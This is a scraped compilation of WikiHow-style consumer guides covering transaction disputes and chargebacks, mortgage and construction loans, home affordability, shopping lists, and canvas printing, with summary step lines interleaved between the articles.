, Consumer protection agencies such as the Consumer Financial Protection Bureau (CFPB) exist to assist you if you are unable to resolve transaction disputes or suspect you may be the victim of fraud.The CFPB was created to assist consumers and ensure fairness in financial transactions. The agency has an online complaint center on its website where you can easily file a complaint and get government intervention on your behalf.
You also may want to file a complaint with the Better Business Bureau or a local chamber of commerce, particularly if the business is a smaller business physically located near you.

Compile evidence of the dispute.,
Contact your bank or credit card company.,
Complete any forms.,
Wait for the bank's decision.",How to Resolve Internet Transaction Disputes2," Chargebacks typically involve the receipt of faulty or defective merchandise, so you should gather evidence of the product's defects as well as documents such as receipts to prove the transaction amount.Keep in mind that federal chargeback protection only extends to purchases over $50 that are made in your home state or within 100 miles (160 km) of your address. This may mean that chargeback protection isn't available for your internet transaction.
However, many banks and credit card companies have their own chargeback policies that provide protection for transactions beyond those covered by federal law.
You will need to gather information about the transaction, including any receipts or email confirmations, as well as your bank or credit card statement that shows the transaction you wish to dispute.
Keep in mind that the more information you have to support your arguments, the more likely your bank or credit card company will be to side with you.

, You can call your bank or credit card company's customer service number to find out more information about its particular chargeback procedure and take the first steps to get that process started.Typically you must demonstrate that you have already made a good faith effort to work with the merchant to resolve the problem, and were unsuccessful.
If you previously attempted to negotiate with the merchant and he or she refused to work with you, a copy of the letter you sent and proof of its receipt should fulfill this requirement.
Sometimes it just isn't possible to contact the company with which you have a transaction dispute. For example, you may have purchased a subscription through a website that was subsequently taken down, but you are continuing to be charged the monthly rate despite the fact that you're not receiving the product or service you ordered.
In this sort of situation, you'll have to explain to your bank or credit card company why it was impossible for you to attempt to resolve the dispute on your own.
Most banks and credit card companies allow you to begin the chargeback process over the phone. Call the customer service line and follow the prompts to dispute a transaction or speak directly to a representative.
Keep in mind that in most cases you must notify your bank or credit card company within 60 days of the date of the transaction if you want to initiate a chargeback.

, After it receives your initial request to initiate a chargeback, your bank or credit card company typically will send you forms to fill out with details about the transaction and the reason you're requesting a chargeback.The forms require you to provide written details about the transaction, including the date of purchase, the items or services you purchased, and why you want to refuse payment. Stick to the facts, and keep your answers brief.
You also may have to describe any other methods you attempted before requesting a chargeback, and why these methods were unsuccessful.
Typically you must attach copies of any documents or other evidence you have to back up your claims.

, Typically your bank or credit card company will contact the merchant about the dispute after receiving your completed forms. Within two billing cycles, it will determine whether to approve or deny your chargeback request.While you may receive a call from your bank or credit card company, it's more likely that you'll receive a written notice after the investigation is complete.
Your bank or credit card company will either return the funds to your account, or send you a written explanation as to why your chargeback request is being refused.
Typically, provided you have sufficient evidence of the problem, your bank or credit card company is going to take your side and put the funds back in your account. However, be aware that the merchant may then come after you for the money.

Log into your account.,
Open a dispute.,
Negotiate with the seller.,
Escalate the dispute.,
Wait for resolution.,
Share your experience.",How to Resolve Internet Transaction Disputes3," If you are a member of an online payment service such as PayPal, your account typically will have options for you to dispute a transaction completed using that service. Read about the dispute resolution process before you begin so you understand what will be expected of you.The process may differ depending on the type of account you have. For example, PayPal has a different process for business accounts than it does for personal accounts, even if you have the same role in the transaction.
The payment service typically will have a deadline if you want to dispute the transaction. For example, PayPal gives you 180 days from the date a payment is posted to dispute the transaction. Note that this is longer than you might have with a traditional bank or credit card company.

, Follow the prompts on the payment service's website to identify the transaction with which you have a problem and send a dispute notification to the seller. You may have to provide information about the transaction and the reason for your dispute.Typically you will be asked to categorize your complaint, and then you can provide details about the specific nature of the dispute.
For example, PayPal provides three categories for disputes: item not received, significantly not as described, or unauthorized transaction.
Since the transaction was processed through the payment service, you typically don't have to provide any receipts or other other information about the transaction itself – the payment service already has this information in its records.

, Typically you and the seller will message each other directly, through the site's resolution center, to resolve the dispute you have with the transaction. While you're negotiating, the payment service may put a hold on the disputed funds so neither party can access them.For example, PayPal gives you 20 days from the date you open your dispute to negotiate with the seller. During that time, the company places a hold on the funds.
However, if you don't resolve or escalate your dispute before the 20-day deadline is up, PayPal will close your dispute and release the funds to the seller.
Typically the seller will get an email notification alerting him or her to your dispute. The seller then has a deadline to respond – usually about a week.

, If you are unable to come to a satisfactory resolution of your dispute, typically the payment service provides a means for you to escalate the dispute and get assistance from customer representatives.Keep in mind that if you're disputing a transaction because you haven't received an item, there may be a waiting period before you can escalate the dispute. This period is designed to ensure that you don't get a refund for the product and then receive it the next day.
Escalating the dispute brings the payment service in as a mediator between you and the seller. The payment service may ask for additional information from you regarding the dispute, and then investigates the situation.

, Once the payment service receives your information, a customer service agent will work with you and the seller to resolve the transaction dispute. Typically you can get updates on the progress of the investigation by checking your account.Services such as PayPal usually provide an estimated date by which your dispute will be resolved after receiving your information.
The customer service agent working on the dispute will request evidence, such as a shipping receipt, from the seller to demonstrate he or she lived up to his or her end of the bargain.
Typically the disputed transaction funds will remain on hold while the customer service agent investigates the situation and works to resolve the dispute.

, If you are dissatisfied with the resolution or believe that the seller was unfair or took advantage of you, leave a customer review for that seller so others can learn from your experience.


Customer reviews can be powerful. Some sellers may refund money even when they know they were in the right just to avoid the possibility of a negative customer review.
If you believe the seller was dishonest, relating your experience to others, either on the seller's website or profile on an online marketing site such as eBay, can serve as a warning.
Recognize the power of your review and keep it honest. Avoid stooping to personal insults or disparaging remarks about the seller. Simply relate the facts about what you experienced.

Refinance your loan.,
Remove your private mortgage insurance.,
Explore federal loan modification options.",How to Lower Your Monthly Mortgage Payment1," The most common way to reduce monthly mortgage payments in the U.S. is to refinance your loan, or reduce your interest rate and change the length of your term payout.When you refinance, you are essentially replacing the existing loan with a new one. A new loan with a lower interest rate will help reduce your monthly payments.


Refinancing can come with hefty processing fees and additional interest-rate costs. Be sure that you won’t end up spending more money over time.;
, If your down payment on your home in the U.S. was less than 20%, then you are paying for private mortgage insurance, or PMI. PMI protects the lender from losing money in the event of foreclosure. These yearly fees can range between 0.3% and 1.5% of the original loan.When your mortgage payment falls below 80% of your home’s appraised value, you can request that your lender remove the fee, thereby reducing your monthly payments.You can also pay your PMI upfront. Talk to your lender about paying this fee upon closing instead of paying it off in increments., If you are having serious financial difficulties in the U.S., you may be eligible to receive help from the Home Affordable Modification Program (HAMP) or from other federal loan modification organizations. Your lender can help you reach out and apply to the particular programs for which you are eligible. It is best to save this option as a last resort, however, as you will have better odds receiving federal assistance if you have tried other options, such as refinancing or recasting, before submitting your application."

Get frozen foods last.",How to Make a Shopping List," Throughout your day-to-day living, you should have a ""to-buy"" list tacked someplace central in your home. If you notice you're out of, or running low on something you'll need, make a note of it on the list. Done in this way, you won't have to stress out about remembering all the things you need to buy. Giving yourself the maximum amount of time to plan will give you the highest chance of remembering everything you need.


A fridge or bulletin board is a great place to keep it.;
, Improvising your list once you're out shopping will result in hasty buys and unhealthy choices. You should have a well-thought out list before you head out the door. Check the pantry and check what's running low. While keeping a running tally of grocery purchases will help you figure out the less obvious things, you can cover a lot of your bases by taking a quick stock of your inventory.


Recipes often require several ingredients. It's a good idea to review your planned recipes thoroughly before heading off to the supermarket.

, Before you sit down to compile your list, you should take a second to think about how often you go to the supermarket. The frequency of shopping trips may depend on your location, as well as your mode of transport. For some people, going to the supermarket can mean a big time investment. If your trips are infrequent, it's all the more important to come prepared with a list. On the other hand, if you're going multiple times a week, it won't usually be an issue if you forget an item or two.


Unless you live right next door to a supermarket, you should nonetheless see how much mileage you can get out of each trip. Try to minimize one-item trips, as they're big time wasters. It's better to get everything you need at once.

, If you already have grocery trips as part of your regular routine, you probably schedule your trips based on how often certain items run out of supply at home. Having some idea beforehand of when a certain item will be used up can help you plan your trips more wisely. If you're smart, you'll never run out any supply because you'll be able to gauge when a trip is needed before it runs out.


It would be a waste of effort to gauge the restock time of every item in your home. Instead, just focus on a few of the biggest things that run out often. Toilet paper and coffee beans are just two of the items you might gauge.

, If there is something you wouldn't normally buy that's currently being sold for a steal, it's sometimes a good idea to switch up your buying habits accordingly. On the other hand, if there's a discount for an item you usually buy, you can take the chance to stock up on more of it than you normally would.

, Most people will prefer to buy groceries according to their own preferences. Nonetheless, giving a default grocery list a looking over can be useful when brainstorming for things you might need. You may come across some items you might never have thought of otherwise.

, Most supermarkets organize their wares according to type. While you're writing down your shopping list, you should make an effort to join different things into similar group. Put all vegetables in a ""vegetables"" section. Do the same for toiletries and frozen food. If you have items bunched together, it will minimize the running around you would have to do if you scratched off the list in order.


Leave a bit of space at the bottom of each category. You will often think of things you need at last minute, and it helps to have a bit of space left over to write them in.
If you're going to more than one store, you should organize by store, then by aisle. However, you should see what you can do about packing all of your purchases into one store trip.

, Quantity is an important part of any shopping list. Although given quantities are sometimes left off a list, it's good to know how much you should get of an item in advance. If you don't have an idea how fast an item runs out at your home, you won't need to be specific.


Listing specific quantities is very important if you have a certain recipe in mind.

, Even if you're going shopping with one essential thing in mind, a successful trip will try to hit as many bases as possible. Keeping your grocery bag filled with dairy, meats, grains and other items like toiletries will leave you feeling like you accomplished more with your trip than if you simply went for a specialized, one-item run.

, People who shop without lists are more prone to succumbing to impulse purchases. When you're planning out your list, try to think how each item will affect your life in the long run. Because you won't have the temptation directly in front of you, you'll be able to better judge which options are the best for your life.

, Depending on where you live, there might be several different options you could go to for your shopping trip. Many of the biggest outlets, like Walmart, list their prices online. If you want to save on some money, you should look up some of the prices online for certain things you're looking to buy. Keep a sharp eye especially out for special deals a given outlet has over its competition.


Some prices are controlled by the manufacturer. If this is the case, it won't matter where you buy the product.

, Having a shopping list on your phone is a good idea because you're able to add to the list as needed. You won't be under such a risk of losing the list either, and most grocery apps will auto-organize your shopping for you to make it more efficient.

, All of the information you'll have for your shopping list may be disorganized in its pure note form. Depending on the size of your grocery trip, it may be worth the extra time it takes to write up a ""final draft"" of your list. Write out the items more neatly, and group them out according to their type. It may feel like extra work, but you'll be saved time in the supermarket if your list is legible and properly outlined.


The process of organizing is simplified if you're using an app to help you with your shopping plans.

, Do a methodical sweep of the store. Go through the most important aisles first, and make sure you have all of the things you need before you move on. Try to cross off your shopping list categories (i.e.: fresh vegetables) at a time.

, Late nights before closing are perfect for this, as well as weekday mornings when most people are busy working. In contrast, it's not recommended you go shopping during the weekend or in the early evening if you can help it. The supermarket will be busier and you'll spend more time wading through the foot traffic.

, You will save on the added fees for plastic bags, and cloth bags are more durable. Using cloth bags to shop with is also environmentally friendly, so you can feel good about yourself while you shop.

, When you're buying food items, it's a smart idea to make a habit of checking the expiry date. This is especially important for things with a short shelf life such as milk. If there are multiple copies of an item available for purchase, check a few of them and pick whichever one has the latest expiry date.

, In-store specials are worth exploiting if it's something you would have wanted anyway. Although your shopping trip shouldn't be dictated by what's on special, taking advantage of these opportunities is a great way to make the most of the money you spend.

, If your shopping trip is going to be fairly in-depth, you'll want to count for the time the frozen grocery items will be out with you. Frozen products like ice cream shouldn't be kept out of frozen storage for too long unless you want a mess on your hands. If you think the shopping trip is going to take a while, aim to have these frozen foods picked up last.

Consider your assets.,
Know how much you will need for a down payment.,
Understand the various financing programs that might be available.,
Consider paying less than the standard amount.,
Know the ratios lenders are using to determine if you qualify for a loan.,
Calculate your expected housing expenses.,
Increase your ability to pay.,
Determine if you can afford the house you're looking for.,
Understand the risks and benefits of selling and buying a house at the same time.,
Calculate the likely sale and profits from your existing home.",How to Calculate How Much House You Can Afford," A down payment requires you to pay a certain amount of money on the spot. This amount is usually determined by the purchase price of the house and the lender requirements (it may be anywhere between 0% and 25% of the selling price of the house). When you apply for a mortgage, the mortgage lender will want to know how much cash you have available for the down payment. Look at all your liquid assets, such as your savings and/or any monetary gifts from family members, to determine a likely maximum downpayment.Be aware that most private lenders will be looking for ""seasoned"" assets, meaning they've been in your account for two months or longer.Quickly transferring money into your account right before you apply for a loan may still cause your loan application to be rejected, even if you have enough for the down payment. Lenders want to see that you are able to save and that you're not lying about your income.;
, For a typical FHA or conventional mortgage, you will usually only be allowed to borrow about 80% of the appraised value. Your down payment will have to cover the difference between that and the selling price. This means that in order to buy a house, you'll need about 20% of the value of the home.Note that the appraised value may be higher or lower than the selling price of the house.Start thinking about how much you'll need for a down payment for the house you want and how much you can reasonably afford.
If you have $30,000 saved for a down payment, for example, you can use it as a down payment for a home that costs $150k.

, Different financing plans require different down payment amounts. You may get a conventional loan or be eligible for a government-backed loan, such as a VA or Federal Housing Administration (FHA) loan.


If you can't afford a 20 percent down payment on your home, but have good credit and steady income, a mortgage broker may assist you with a combination mortgage. In that, you're taking out a first mortgage up to 80% of the value of the home, and a second mortgage for the remaining amount. While the rate on the second mortgage will be slightly higher, the interest on it is tax-deductible and combined payments should still be lower than a first mortgage with PMI.Certain cities offer programs to support homebuyers. For example, Atlanta offers a program called Invest Atlanta that gives qualified homebuyers an interest-free second mortgage to cover the cost of a down payment.Search online for housing assistance programs in your area.
If you're a military veteran, you may qualify for a zero-down payment mortgage through the U.S. Department of Veterans Affairs (VA). These mortgages do not require PMI and protect the buyer from paying too much in closing costs, making them a great deal for those who qualify.A FHA loan is insured by the government and may allow a private lender to reduce your down payment to between 3.5 and 10% of the purchase price.Usually you need a minimum credit score of 580 to qualify for a FHA loan.Conventional loans are not insured by the federal government and usually require 10–25% of the purchase price for a down payment.

, While most banks will be reluctant to loan to a buyer making a very low down payment, government programs may help you get a mortgage with a down payment as low as three percent. In addition to FHA loans, look into low down payment loans through the lenders Freddie Mac and Fannie Mae.Putting down less usually requires more of the buyer and an additional form of insurance, but can be a reasonable way for new buyers to achieve their dreams of homeownership.


In order to get one of these loans, a buyer must:

Buy private mortgage insurance (PMI). This can cost $50 per month or more depending on the value of your home.Have a fair credit score (usually over 620)
Provide evidence of income, job status, and assets.
Undergo homeownership counselingBe aware that there are risks associated with these programs. While your down payment will be very low, you may end up paying a great deal more in the long-term due to potentially higher interest rates and paying into a PMI, which does not increase equity., ""28 and 36"" is a commonly used ratio. It means that no more 28% of your monthly gross income (your income before you pay taxes) should go towards paying housing expenses (including mortgage payments, real estate taxes, and insurance). In addition, monthly payments on your outstanding debts, when combined with your housing expenses, must not exceed 36% of your monthly gross income.Find each percentage for your monthly gross income. For example, if you make $45,000 per year, you have $3,750 in monthly income. 28 and 36 percent of $3750 equal $1050 and $1350, respectively.
In this situation, this means that your monthly housing expenses should be no more than $1050, which represents 28% of your monthly income. In addition, your total payments on debt, including on your car and mortgage, should not exceed $1350, which is 36% of your monthly income. If your projected payments are higher than these values, the bank may decline your mortgage application.
So, if you maxed out your housing payment amount at 28% and paid $1050 per month, you would have $300 per month remaining to pay down your other debt ($1350 - $1000= $300).
Monthly payments on outstanding debts (included in the 36%) can include car payments, alimony, credit card payments, or any other debts you pay monthly (like student loans)., You'll need to estimate the annual real estate taxes and insurance costs in your area and add those numbers to the average price of the home you want to buy. You should also add an estimate of how much you can expect to pay in closing costs, which are charges and fees that generally run between 3 to 6 percent of the money you're borrowing.Credit unions often offer lower closing costs to their members.


Put these totals into a mortgage calculator to find your monthly payments. You can find a calculator online or make your own in a spreadsheet. If the figure is above 28% of your gross income then you will have a hard time getting a mortgage., If your target home or home price has a monthly payment that you are currently unable to pay, you have several options. You can either look for cheaper housing, wait several more years and work towards earnings more income, or increase your ability to pay more quickly. This third option can be done by reducing your debt or by increasing your available income.


Reducing debt simply means paying off any outstanding debt you currently have. This can include car payments and credit card debt. Once you have taken care of these debts, you are able to contribute more each month to your mortgage.
Increasing available income does not simply mean making more money, though it can be taking on a second job or finding part-time work. Instead, this can mean sending a non-working spouse to work or going in together on a house with a partner or friend., After considering the above money-saving options, determine your ability to pay using your specific circumstances and an online mortgage calculator. Weigh the pros and cons of taking on an additional job, taking out a high-interest loan, taking out a loan that requires PMI, or saving for a large down payment before committing to any of these options.


Bank rate's calculator is particularly in-depth: http://www.bankrate.com/calculators/mortgages/new-house-calculator.aspx.

, If you are looking to ""move up"" — that is, sell your current home and buy a new house, you may need to wait for your current home to sell so you can afford the down payment on your new home and avoid paying two mortgages.If you sell your house first, you may feel pressured to find and buy your new house quickly, but it may also give you the money you need to put a down payment your dream home.You may have to make an offer on your new house but negotiate for the purchase to be contingent on the sale of your old house. Contingent offers are more risky and less desirable for the seller, since the sale can't be completed until the buyer's house is sold. You may want to put your current house on the market first.

, The amount of money you will make selling your home depends on a variety of factors, including how much you still owe on the home, any fees you will need to pay a realtor, property taxes, etc.If you son't know how much your house will sell for, investigate recent sales in your area of similar homes and use that as a starting point.


Let's say you think your house will sell for $250,000. Subtract the amount you still owe on your mortgage from this number. So if you still owe $75,000, $250,000 - $75,000 = $175,000. From that number, subtract any additional fees, such as your real estate agent's commission (this may be a percentage of the sale price or a flat fee), closing fees, transfer tax, and whatever property taxes you owe (you pay these up to the day you sell the house). Assume your realtor gets 6% of the sale price ($15,000), there's a total of $750 in closing fees, and you owe $500 in property taxes. Add these numbers together ($15,000 + $750 + $500 = $16,250) and subtract that from $175,000 to find how much you will make from selling your house. $175,000 - $16,250 = $158,750.
You will have $158,750 to put toward a down payment on a new house

Negotiate a low interest rate with several lenders.,
Decide on the mortgage term.,
Place a large down payment on your home.",How to Lower Your Monthly Mortgage Payment2," You can negotiate your mortgage interest rate with your bank, broker, or lender, and shopping around will offer you more options and leverage. Strong credit scores, assets, and a stable job also work in your favor, so be sure to cite these as you are shopping for a mortgage. If your potential lender acknowledges that you are a dependable candidate and they are aware that you are looking elsewhere for your mortgage, you can make a strong case that your interest rate should be lowered.If you have a strong credit score, point that out to your lender and mention that other banks or brokers have offered you a lower quote.

, A 30-year mortgage can help you save more money over time, lower your monthly payments, and can provide you with tax incentives in the U.S. A 15-year payment plan can help you pay off your mortgage faster, but you will have larger monthly payments. This may hinder your cash flow and prevent you from exploring other investments.When you are applying for a mortgage, consider the lifespan of the mortgage and what is most feasible for you and your family.

, Reduce the amount of money you need to borrow by paying a large down payment on your home. If you are in the position to pay more money upfront, you will have a lower mortgage principal that you will have to pay interest on. Additionally, placing a down payment that is 20% or greater will eliminate your PMI payments. This can help shorten the lifespan of your mortgage and slash your interest payments."

Opt to recast your loan.,
Make an additional monthly payment every year.,
Pay your mortgage bi-weekly.",How to Lower Your Monthly Mortgage Payment3," When you recast a loan in the U.S., you pay a significant chunk of your mortgage balance, also known as the principal, in one go. Your lender will change the conditions of your existing loan and calculate a new monthly payment based upon the new, reduced principal. This will lower your monthly payments, improve your cash flow, and save money in interest over the lifespan of your loan.Your lender may charge a modest recasting fee., To reduce the lifespan of your mortgage, aim to make an extra payment every year. It may seem counterintuitive to pay more to save, but this will trim your interest payments over time. In addition, this extra payment will reduce the reminder of your principal, which will cut back on the loan’s lifespan. While you may be paying more upfront each year, you can save thousands on the interest payment.For example, if you have a $200,000 mortgage with a 6% interest rate that is fixed over a 30-year period, you will pay $1,199 each month for your principal and your interest. Paying one more installment of $1,199 every year can cut your mortgage span by 5 years and help you save $47,000 in interest., Rescheduling your mortgage payments is a simple way to decrease the lifespan of your mortgage. If you pay half of your monthly payment every other week instead of once a month, you will make 26 half-payments each year. This means you will be paying 13 monthly payments instead of 12. The additional money will be applied to your remaining principal. This can help you pay off your loan more quickly and reduce your interest rate payments.If you set up bi-weekly payments, a 30-year fixed rate mortgage that is $270,000 with an interest rate of 3.635% can save $26,511 in interest over the lifespan of your loan.Talk to your lender about paying your loan biweekly instead of monthly.

Understand the risk of a second mortgage.,
Do a realistic budget.,
Determine what kind of second mortgage you would like.,
Find out your credit score.,
Determine how much equity you have in your home.,
Have your house appraised.",How to Get a Second Mortgage on Your Home1," A second mortgage adds to your monthly bills. It comes at a high interest rate because it is a risky investment for lenders, since they would be paid off after the primary mortgage company in the event of foreclosure. Seriously consider if you want your house to serve as collateral for this kind of loan.


Using a second mortgage to pay off a high-interest loan may help you lower the interest you're paying in the short term. However, it is very risky to put your house on the line to reduce your debt.;
, You want to make sure payment on a home equity line of credit is affordable. In general, you only want a third of your combined household income to go to housing costs.This includes any rent, mortgage payments, utilities, property taxes, homeowner's insurance, and any additional community fees., There are two main kinds. Home equity lines of credit (HELOCs) are open-end, meaning that you can continue borrow money up to the limit even as you pay back the loan. A basic home equity loan is closed-end, meaning that you get one sum and may not borrow more money later.HELOCs are similar to a credit card – you only have to pay back the amount you borrow. This may be more useful if you need a small, but yet to be determined, amount of money.
One drawback of a HELOC is that some lenders will not let you take out additional credit if the value of your property drastically decreases.Home equity loans are good for a lump sum. If you have, for example, an estimate for building an addition to your house, you know exactly how much money you will need. This situation would call for a home equity loan., In the world of money lending, your credit score is used to approve or deny your application. It also determines what interest rates, or APR, you qualify for. You can get a free credit report from a federally approved agency such as Experian or Equifax once a year. This should give you an idea of how good your credit score might be. However, remember that the free credit report does NOT include your score. You have to pay to see that.


If you have never seen your score before, it is best to pay for your actual credit score. However, you can get a free FICO score estimate on the internet. This scale is used as the basis of many credit scoring agencies.For more on checking your credit score, see Check Your Credit Score.

, Equity is the difference between the value of the house minus the amount you owe. That means if you still owe $60,000 on a $100,000 house, your equity is $40,000. This number will be used by lenders to calculate how much money they can loan you with a second mortgage.

, The other number you need to know up front is the value of your home. Some factors to consider when estimating this are the price you paid, any changes in neighborhood, and any additions you have made. You can also look at similar houses in the neighborhood that have gone on the market recently. Consider having your house appraised by a professional before you apply for a second mortgage.

Know how to get your photo on a canvas.,
Know how to make sense of a 'thousand' options.,
Know how to find the canvas printers hitting the 'sweet spot'.",How to Know Where to Buy Canvas," Getting your own photo on a canvas, whether it's a photo you took with your cell phone or one you took with a $10,000 camera, is a very simple process. And it's the same for everyone. It is always a matter of getting one's image to the right people, who then take that image and print it on a canvas. Here are 3 VERY simple steps to getting YOUR photo printed on a canvas:


Transfer your image from your camera to your computer.

This in itself may seem daunting, but it's really very simple. It's a matter of using the cords that came with your cell phone, your point-and-shoot camera, or your SLR camera and connecting one end to your camera and the other end to your computer. Usually the computer end will go into a USB port, which every computer will have. When your computer recognizes there is a device attached to it, typically it will open an image program (such as iPhoto) and ask if you want to download the images. If not, you should be able to open up your ""My Computer"" and find the attached device and get to the images that way. Once you have found the image you want, save it under a name you'll recognize (other than the number that was probably assigned to it); you'll probably want to save it as a JPG, since all of the canvas printers will accept this format. You are well on your way now!


Find the right canvas printer for you (I'll provide help below on this), and ask how you should get them that image.

Once you have your image saved as a JPG, you are almost there. Now you just need to get your image into the hands of the canvas printers. Most of them have a very simple process for uploading your image, and most of the time it is a simple upload on their site. If you follow their links for uploading an image, they will lead you to the right place. With many canvas printers you also have the option of e-mailing in your photo as an attachment if that is easier for you. The better canvas printers will offer this option, and if you don't see it advertised, just ask if you can do this. They will usually then ask you to specify your options (see below).


Submit your photo, choose your options, and pay! (Your canvas should be on the way shortly)...

When you're on the upload screen, just browse until you find the image you have saved and then click ""Upload."" Then they will usually have you select a size you want for your canvas, the style (white sides, black sides, image continued on sides, etc.), and the size of stretcher bars (typically .75"" or 1.5""). The ""stretcher bars"" just refers to the wood that the canvas is mounted on, and how thick you want the wooden sides underneath the canvas to be. Once you have selected your options (and I highly recommend 1.5"" stretcher bars and your photo continued on the sides of the canvas), you enter your payment information (which is very safe to do online as long as the site URL starts with https://) and click submit. Your canvas should be printed soon and on its way to you within a few days!

;
, There are literally a thousand places (more, actually) you can get your image printed on a canvas, between local photo shops, online stores, big box stores, specialty canvas shops, etc. Of all these options, how should you choose where to get your canvas printed? And does it even matter?


It absolutely does matter where you get your canvas printed.
There is a HUGE difference in quality between the best canvas printers and the worst.
To get a high quality canvas, you do not have to pay more for it.

That third statement is shocking, and this is part of what makes the printing of canvases interesting, exciting, and confusing. There is a large amount of profit built into each individual canvas that is printed, because printers have to build in to each canvas sale all the costs associated with making canvases. They have to consider ink, wear and tear on machines, material costs, time spent, etc. These many factors make the pricing of canvases all over the map. But the best canvas printers have hit their sweet spot and can offer the highest quality canvases (because of their expertise and experience printing them) for extremely affordable prices.



, The sweet spot is quality and price.

Identify the two types of construction loans.,
Decide which loan type is right for you.,
Contact regional banks and credit unions.,
Find out the requirements for applying.,
Shop around.,
Confirm the lender is experienced in construction loans.,
Check your credit history.,
Get pre-qualified before buying land.,
Create a timetable for construction.,
Enter into a construction contract.,

Gather required documents.,
Submit your application.,
Receive your schedule of draws.,
Understand the loan.,
Choose whether to lock in your interest rate.,
Close on your loan.,
Pay off your construction loan.",How to Get a Construction Loan (US)," Before shopping for loans, understand the two types of construction loans on the marketplace:


Construction only loans. These loans are short-term loans that last for a year or so. They usually have adjustable rates that rise or fall with the prime rate. At the end of the term, you must pay off the entire loan. This means refinancing into a more conventional loan that can be for up to 30 years.Construction-to-permanent loans. This is an all-in-one option that you can use to buy land and complete your home. You then work with the lender to transition to a permanent loan after construction is completed.;
, Each type of construction loan has positives and negatives. Consider the following when deciding which to pursue:

The application process is easier for an all-in-one construction-to-permanent loan. You apply only once. By contrast, you’ll need to apply twice to get a construction loan and then another permanent loan to pay off the construction loan.
You’ll save several thousand dollars in closing costs with a construction-to-permanent loan.However, your interest rate might be higher with an all-in-one loan. By the time you finish construction, interest rates could have fallen dramatically. Unfortunately, you could be locked into a higher rate with your construction-to-permanent loan.
Generally, you also have fewer options with an all-in-one loan. If you get a construction only loan, then you can find a permanent loan from any lender you choose, which might provide more options.

, Construction loans are a small part of the market for home loans. They are also higher risk, so not all lenders offer them. You should first approach regional banks and credit unions.

Ideally, you should approach an institution that you already have a strong lender relationship with.For example, if you’ve taken loans with a bank before, approach them again.

, Each bank will have its own requirements, which you should research before applying. For example, banks often require the following:

A qualified builder. This person is typically a licensed general contractor with a solid reputation for building homes. By hiring a qualified builder, you show the bank that the loan is a good risk.You can find a builder by contacting your local chapter of the National Association of Home Builders.Specifications. Banks will want you to provide floor plans and information on the materials used.
Down payment. Lenders will typically require 20-25% as a down payment.
Appraisal. You need to have your specifications appraised. The appraiser will find comparable properties based on the information you provide.

, Most banks offer loans but not choices. One way to get different choices is to shop at every bank and credit union in town. When you call or visit, ask for the construction loan department. If the bank doesn’t offer construction loans, then move on to the next bank.


Alternately, you can hire a construction loan broker to shop around for you. This might be a good option if you are too busy. Brokers can get loans at wholesale rates and can often get clients good deals. They can also explain your options to you and answer any questions you might have.
You can find a construction loan broker by getting a referral from your local Chamber of Commerce or by searching online., You’ll want a lender who has handled construction loans before. When you meet with a loan officer, ask the following questions to check whether they have the necessary experience:


How long have they been doing construction loans?
What is the loan-to-cost ratio (LTC) required for construction loans? The range is usually 5-20%.
Which is better: a voucher or draw disbursement system? Have the loan officer explain each to you.
Does the bank require an interest reserve account? A contingency account? An experienced loan officer should be able to answer these questions easily.

, You’ll need good credit to get a construction loan. Pull a free copy of your credit report and review it for errors. If you find any, then dispute them with the credit bureau that has the wrong information. Check for the following:accounts listed that don’t belong to you
accounts incorrectly listed as in default or in collections
the wrong balance listed
the wrong credit limit listed
accounts that should have fallen off your credit report

, You might not qualify for a construction loan, which means you shouldn’t rush out and buy land. Instead, call the lender and ask if they can pre-qualify you. This process takes only a few minutes. You provide information about your income, assets, and debts, which the lender uses to decide the amount you can borrow.Pre-qualification is not approval, which requires a much more in-depth analysis of your credit worthiness and finances.
Nevertheless, pre-qualification can provide you with some idea of what you can borrow.

, Construction loans are difficult to get because you don’t have a finished home to act as collateral for the loan. Accordingly, the lender will want to closely monitor the progress of construction. You should put together a timetable of construction and include it in your construction contract.Talk with your builder about what you want. They can help you come up with a realistic estimate of how long each stage will take.

, You’ll need to give the bank a construction contract when you apply.A construction contract is a written agreement between the borrower and the builder for services to be provided by the builder. You should have a lawyer review the contract before signing. A valid construction contract should include the following:identity of the parties to the contract, including contact information
scope of the builder’s work, such as obtaining permits, furnishing equipment and labor, etc.
timing, such as when construction will begin, end, and the schedule of work in between
reasons extensions of time may be granted
payment: when, where, and how
how plans can be changed
warranties to fix defects in the home and what the builder will do to fix them
how you will resolve disputes, such as mediation or arbitration
signatures of the borrower and builder

, Your builder might or might not have all of the insurance that you need. You should check ahead of time. If they don’t, then you’ll need to purchase insurance before applying for your loan. Consider the following:Builder’s risk insurance. This insurance covers your home while under construction, and protects against vandalism or theft of tools, equipment, and materials. Policies generally last nine months to a year and can be renewed. If your builder has this insurance, then get a copy of their certificate of insurance.
Liability coverage. Someone might get injured during construction, in which case you’ll want coverage. Ask your builder if they have general liability coverage. You should also have a homeowner’s policy. Generally, most people get $300,000 of liability coverage through their homeowner’s policy.

, You’ll need to submit many documents when you apply for your construction loan. Accordingly, you should gather them ahead of time. Ask your lender what you will need, but generally you should get the following:copy of the deed to the land
HUD-1 Settlement Statement (if necessary)
contract for the land if you aren’t yet the owner
construction contract
builder information (name, contact information, and federal tax ID number)
plans and specifications for the home
certificate of liability insurance for the builder
builder’s risk/homeowner’s policy
building permit if builder wants disbursement at closing

, The approval process generally takes a little longer for a construction loan than a typical mortgage. Your lender will review your credit history, income, debts, assets, and appraisal before granting approval.After you submit your loan, the lender should provide you with disclosures that will guide you through the loan process.
Make sure to get all required documents to the bank at least 48 hours before your scheduled closing.

, After approval, you’ll get a bank draft schedule, which follows the stages of construction. You’ll request funds from the bank, and the bank will have someone check on the progress of the construction before releasing the money.You should review this schedule carefully. It should also explain what documentation you need to submit to the lender in order to get a disbursement., A construction loan isn’t a typical home mortgage. As you review your documents, you might not understand some items listed. Talk to the loan officer if you have questions.

One thing you might not understand is the “interest reserve.” Generally, you will not make payments on the loan while your home is being built. Instead, you will make an interest payment on the funds disbursed.This money will come out of the interest reserve, which is a sum of money set aside for these payments.Construction loans also add contingency funds in case of cost overruns. Usually, the bank adds 5-10% of the loan balance. If you don’t use these funds, they won’t be added to your mortgage.

, You should ask whether the interest rate will float for the length of the construction or whether you can lock in the rate upfront. Also, if you have a construction-to-permanent loan, then you should ask whether you can lock in the rates now for the permanent mortgage.


If rates are trending upwards, you should consider locking. Before locking, check whether you will be charged a fee, which will reduce the amount you will save by locking in.
However, if rates are moving down, you should consider letting the interest rate float.

, If you got a construction only loan, then you will have two closings—one on the construction loan and then a second closing after you finish construction and get a permanent loan to pay off your construction loan.

